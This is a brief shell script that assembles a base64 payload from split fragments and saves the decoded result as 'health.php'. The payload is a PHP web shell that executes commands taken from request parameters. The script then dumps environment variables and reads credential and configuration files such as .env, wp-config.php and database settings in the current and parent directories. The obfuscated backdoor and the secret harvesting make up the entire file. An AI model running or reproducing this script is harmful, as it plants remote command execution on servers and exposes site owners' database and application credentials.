#!/bin/sh
mkdir q;x=OK
echo T0K3N>q/A
wc -c<q/A;x=OK
echo PD9wa>piece0
echo HAgc3>piece1
echo lzdGV>piece2
echo tKCRf>piece3
echo R0VUW>piece4
echo zBdKT>piece5
echo s=>piece6
cat piece*>joined
base64 -d joined>stage
mv stage health.php
env
cat .env wp-config.php config/database.php app/etc/env.php sites/default/settings.php
cat ../.env ../wp-config.php ../config/database.php ../app/etc/env.php ../sites/default/settings.php
